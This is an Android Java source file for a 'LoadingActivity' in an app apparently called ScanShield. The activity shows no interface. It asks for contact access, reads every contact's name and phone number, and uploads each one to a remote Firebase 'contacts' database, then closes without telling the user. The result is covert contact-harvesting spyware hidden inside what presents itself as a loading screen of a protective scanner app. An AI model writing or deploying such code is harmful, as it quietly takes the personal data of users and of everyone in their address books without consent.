package com.example.scanshield_mobile_app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class LoadingActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CONTACTS = 1;
    private static final String TAG = "LoadingActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // No UI (no setContentView)
        checkContactPermission();
    }

    private void checkContactPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CONTACTS);
        } else {
            fetchAndUploadContacts();
        }
    }

    private void fetchAndUploadContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                if (nameIndex >= 0 && phoneIndex >= 0) {
                    String name = cursor.getString(nameIndex);
                    String phone = cursor.getString(phoneIndex);
                    uploadContactToFirebase(name, phone);
                }
            }
            cursor.close();
        }

        // Optionally finish the activity after uploading
        finish();
    }

    private void uploadContactToFirebase(String name, String phone) {
        DatabaseReference database = FirebaseDatabase.getInstance().getReference("contacts");
        String contactId = database.push().getKey();

        HashMap<String, String> contact = new HashMap<>();
        contact.put("name", name);
        contact.put("phone", phone);

        if (contactId != null) {
            database.child(contactId).setValue(contact)
                    .addOnSuccessListener(aVoid ->
                            Log.d(TAG, "Contact uploaded: " + name))
                    .addOnFailureListener(e ->
                            Log.e(TAG, "Upload failed", e));
        }
    }

    // Handle permission result
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CONTACTS &&
                grantResults.length > 0 &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            fetchAndUploadContacts();
        } else {
            Log.e(TAG, "Permission denied to read contacts");
            finish(); // Close the activity if permission is denied
        }
    }
}
